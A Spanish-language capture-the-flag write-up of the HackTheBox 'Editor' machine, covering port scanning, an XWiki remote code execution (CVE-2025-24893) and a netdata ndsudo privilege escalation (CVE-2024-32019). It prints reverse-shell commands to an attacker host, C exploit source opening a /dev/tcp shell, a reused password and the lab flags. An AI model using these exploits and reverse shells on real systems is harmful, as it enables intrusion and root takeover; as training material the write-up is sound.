---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Editor HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 06:02 EDT
Nmap scan report for 10.10.11.80
Host is up (0.041s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.97 seconds
```

Veremos varias cosas interesantes entre ellas el puerto `8080` y el puerto `80`, en el `80` veremos que nos redirige al dominio `editor.htb`, por lo que vamos añadirlo a nuestro archivo `hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>          editor.htb
```

Lo guardamos y si cargamos la pagina con dicho `dominio` veremos lo siguiente:

```
URL = http://editor.htb/
```

Veremos una pagina normal sin nada aparente sospechoso, si le damos a `Docs` nos llevara a un `subdominio` que no tenemos añadido llamado `wiki.editor.htb` por lo que vamos añadirlo de esta forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>          editor.htb wiki.editor.htb
```

Ahora vamos a entrar de esta forma:

```
URL = http://wiki.editor.htb/xwiki/bin/view/Main/
```

Veremos un `software` el cual vemos de la misma forma que si entramos por la `IP` y el puerto de esta forma:

```
URL = http://<IP>:8080/
```

Por lo que vamos a investigar este `software` si tuviera alguna vulnerabilidad a nivel de versiones, si vamos al `footer` podremos identificar esta version `XWiki Debian 15.10.8` si buscamos informacion sobre esta version, podremos ver que es vulnerable a este `CVE` llamado `CVE-2025-24893`, consiste en realizar un `RCE`.

URL = [CVE PoC XWiki RCE](https://github.com/gunzf0x/CVE-2025-24893)

Antes de ejecutar nada vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora vamos a ejecutar el exploit tal cual como viene en el `github` a ver si funciona:

```shell
python3 exploit.py -t 'http://<IP>:8080' -c 'busybox nc <IP_ATTACKER> <PORT_ATTACKER> -e /bin/bash'
```

Info:

```
[*] Attacking http://10.10.11.80:8080
[*] Injecting the payload:
http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.32%207777%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed

~Happy Hacking
```

Si volvemos a donde tenemos la escucha:

```
listening on [any] 7777 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.11.80] 60878
whoami
xwiki
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user oliver

Si empezamos a explorar la carpeta de `WEB-INF` del usuario `wiki` veremos un archivo interesante.

```
/usr/lib/xwiki/WEB-INF
```

Dentro de este directorio veremos esto:

```
total 280
drwxr-xr-x 4 root root   4096 Jul 29 11:48 .
drwxr-xr-x 7 root root   4096 Jul 29 11:46 ..
lrwxrwxrwx 1 root root     16 Mar 27  2024 cache -> /etc/xwiki/cache
drwxr-xr-x 2 root root   4096 Jul 29 11:46 classes
lrwxrwxrwx 1 root root     16 Mar 27  2024 fonts -> /etc/xwiki/fonts
lrwxrwxrwx 1 root root     28 Mar 27  2024 hibernate.cfg.xml -> /etc/xwiki/hibernate.cfg.xml
lrwxrwxrwx 1 root root     41 Mar 27  2024 jboss-deployment-structure.xml -> /etc/xwiki/jboss-deployment-structure.xml
lrwxrwxrwx 1 root root     24 Mar 27  2024 jetty-web.xml -> /etc/xwiki/jetty-web.xml
drwxr-xr-x 2 root root 270336 Jul 29 11:46 lib
lrwxrwxrwx 1 root root     22 Mar 27  2024 observation -> /etc/xwiki/observation
lrwxrwxrwx 1 root root     22 Mar 27  2024 portlet.xml -> /etc/xwiki/portlet.xml
lrwxrwxrwx 1 root root     22 Mar 27  2024 sun-web.xml -> /etc/xwiki/sun-web.xml
lrwxrwxrwx 1 root root     29 Mar 27  2024 version.properties -> /etc/xwiki/version.properties
lrwxrwxrwx 1 root root     18 Mar 27  2024 web.xml -> /etc/xwiki/web.xml
lrwxrwxrwx 1 root root     20 Mar 27  2024 xwiki.cfg -> /etc/xwiki/xwiki.cfg
lrwxrwxrwx 1 root root     28 Mar 27  2024 xwiki-locales.txt -> /etc/xwiki/xwiki-locales.txt
lrwxrwxrwx 1 root root     27 Mar 27  2024 xwiki.properties -> /etc/xwiki/xwiki.properties
```

De todos estos archivos el que encontre algo interesante es el llamado `hibernate.cfg.xml`, por lo que vamos a filtrar en el propio archivo por `pass` a ver si hay algo interesante.

```shell
cat hibernate.cfg.xml | grep "pass"
```

Info:

```
	<property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

Veremos varias contraseñas, pero entre ellas la que mas atrae es `theEd1t0rTeam99`, por lo que vamos a probarla con el primer usuario creado en la maquina con `SUID` `1000` llamado `oliver` a ver si fuera su contraseña por `SSH`.

```shell
ssh oliver@<IP>
```

Metemos como contraseña `theEd1t0rTeam99`...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Sep 18 09:26:16 AM UTC 2025

  System load:  0.32              Processes:             336
  Usage of /:   75.9% of 7.28GB   Users logged in:       1
  Memory usage: 58%               IPv4 address for eth0: 10.10.11.80
  Swap usage:   9%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 18 11:08:23 2025 from 10.10.14.32
oliver@editor:~$ whoami
oliver
```

Con esto veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
cbe28368bef40406e2b6e691139a1f06
```

## Escalate Privileges

Si listamos de que grupo somos, veremos lo siguiente:

```shell
id
```

Info:

```
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

Vemos que pertenecemos al grupo `netdata`, vamos a ver que archivos podemos modificar o leer con dicho grupo.

Vamos a buscar archivos del grupo que podamos ejecutar o que sean interesantes:

```shell
find / -group netdata -type f -executable 2>/dev/null
```

Info:

```
/opt/netdata/var/lib/netdata/registry/netdata.public.unique.id
/opt/netdata/var/lib/netdata/.agent_crash
/opt/netdata/var/lib/netdata/netdata.api.key
/opt/netdata/usr/libexec/netdata/plugins.d/charts.d.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/apps.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network-helper.sh
/opt/netdata/usr/libexec/netdata/plugins.d/python.d.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ioping.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/perf.plugin
```

Veremos en todo esto algo interesante un archivo llamado `netdata.api.key`, si lo leemos veremos lo siguiente:

```
6c6fd886-4a06-11f0-9b17-005056b42a8d
```

Vemos una `API` que puede servir para la pagina `netdata`, si listamos los puertos, veremos lo siguiente:

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                        Local Address:Port                    Peer Address:Port         Process         
udp            UNCONN          0               0                                 127.0.0.1:8125                         0.0.0.0:*                            
udp            UNCONN          0               0                             127.0.0.53%lo:53                           0.0.0.0:*                            
tcp            LISTEN          0               4096                          127.0.0.53%lo:53                           0.0.0.0:*                            
tcp            LISTEN          0               4096                              127.0.0.1:35535                        0.0.0.0:*                            
tcp            LISTEN          0               128                                 0.0.0.0:22                           0.0.0.0:*                            
tcp            LISTEN          0               511                                 0.0.0.0:80                           0.0.0.0:*                            
tcp            LISTEN          0               70                                127.0.0.1:33060                        0.0.0.0:*                            
tcp            LISTEN          0               4096                              127.0.0.1:19999                        0.0.0.0:*                            
tcp            LISTEN          0               4096                              127.0.0.1:8125                         0.0.0.0:*                            
tcp            LISTEN          0               151                               127.0.0.1:3306                         0.0.0.0:*                            
tcp            LISTEN          0               128                                    [::]:22                              [::]:*                            
tcp            LISTEN          0               511                                    [::]:80                              [::]:*                            
tcp            LISTEN          0               50                       [::ffff:127.0.0.1]:8079                               *:*                            
tcp            LISTEN          0               50                                        *:8080                               *:*
```

Vemos que esta el puerto `19999` en local que suele corresponderse a la pagina `netdata` por lo que vamos a realizar lo siguiente para hacer un `portforwarding` con `SSH` de esta forma:

```shell
ssh -L 19999:127.0.0.1:19999 oliver@<IP>
```

Metemos como contraseña `theEd1t0rTeam99`, con esto estaremos dentro, por lo que si accedemos en local a dicho puerto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-18 135416.png" alt=""><figcaption></figcaption></figure>

Vemos que nos aparece un cuadro de mandos de rendimiento, pero me llama la atencion ese `Node.js` que pone que es una version antigua y que es recomendable actualizar.

Pero si obtenemos informacion de la `API` de esta forma:

```shell
curl http://127.0.0.1:19999/api/v1/info
```

Info:

```
{
    "version":"v1.45.2",
    "uid":"6c5c7d22-4a06-11f0-9b17-005056b42a8d",
    "hosts-available":1,
    "mirrored_hosts":["editor"],
    "mirrored_hosts_status":[{
            "hostname":"editor",
            "hops":0,
            "reachable":true,
            "guid":"6c5c7d22-4a06-11f0-9b17-005056b42a8d",
            "node_id":null,
            "claim_id":null
        }],
............................<RESTO DE CODIGO>......................................
```

Veremos que aparece la version del `netdata`, si buscamos en internet dicha version las posibles vulnerabilidades que pueda tener, veremos esta pagina de aqui en la que se puede realizar una escala de privilegios.

URL = [Vuln netdata v1.45.2](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)

Si leemos veremos que hay un archivo el cual es el vulnerable llamado `ndsudo` del que hablan y si nos fijamos antes descubrimos ese binario en el `find`.

```
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Vemos que tiene permisos `SUID`, por lo que tambien es bastante interesante, investigando un poco mas de que podemos hacer con dicho binario podremos ver el siguiente `PoC` en este repositorio.

URL = [CVE-2024-32019 - PoC](https://github.com/AliElKhatteb/CVE-2024-32019-POC)

Vemos que primero crea un `exploit.c` de esta forma en la maquina `host`:

```c
#include <unistd.h>  // for setuid, setgid, execl
#include <stddef.h>  // for NULL

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1", NULL);
    return 0;
}
```

Despues lo compila de esta forma con este nombre.

```shell
x86_64-linux-gnu-gcc -o nvme exploit.c -static
```

Echo esto abriremos un servidor de `python3` para pasarnos el binario vulnerable.

```shell
python3 -m http.server 80
```

En la maquina victima haremos esto para descargarnos dicho binario en la carpeta `/tmp`.

```shell
cd /tmp
wget http://<IP_ATTACKER>/nvme
```

Cuando lo tengamos le daremos permisos de ejecuccion:

```shell
chmod +x nvme
```

Ahora nos pondremos a la escucha como lo hayamos configurado en el `exploit.c`:

```shell
nc -lvnp <PORT>
```

Y en la maquina victima tendremos que ejecutar el siguiente comando:

```shell
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.11.80] 46540
root@editor:/tmp# whoami
whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
2c23e9a5027f65200d5b4e07fdac42f1
```
